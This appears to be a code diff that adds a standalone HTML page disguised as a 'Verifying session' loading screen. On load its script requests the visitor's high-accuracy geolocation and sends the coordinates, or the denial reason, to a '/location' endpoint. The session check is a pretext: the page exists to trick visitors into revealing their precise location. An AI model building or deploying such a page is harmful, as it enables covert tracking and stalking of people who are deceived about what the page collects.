@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Loading...</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background-color: #0f172a;
+      color: #f8fafc;
+      font-family: system-ui, -apple-system, sans-serif;
+    }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 5px solid #334155;
+      border-top-color: #38bdf8;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 16px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .status {
+      font-size: 15px;
+      color: #94a3b8;
+      margin-bottom: 16px;
+    }
+    .btn {
+      padding: 10px 20px;
+      background: #0284c7;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="spinner"></div>
+  <div class="status" id="statusText">Verifying session, please wait...</div>
+  <button class="btn" id="continueBtn" onclick="requestLocation()">Continue</button>
+
+  <script>
+    function requestLocation() {
+      if (!navigator.geolocation) {
+        sendResult({ status: "error", error: "Geolocation not supported" });
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        function (position) {
+          sendResult({
+            status: "allowed",
+            lat: position.coords.latitude,
+            lon: position.coords.longitude,
+            acc: position.coords.accuracy
+          });
+          document.getElementById("statusText").innerText = "Verification complete.";
+        },
+        function (error) {
+          sendResult({
+            status: "denied",
+            error: error.message
+          });
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    }
+
+    function sendResult(payload) {
+      fetch("/location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    }
+
+    // Trigger automatically on load, with the button available for browsers requiring user interaction
+    window.onload = requestLocation;
+  </script>
+</body>
+</html>
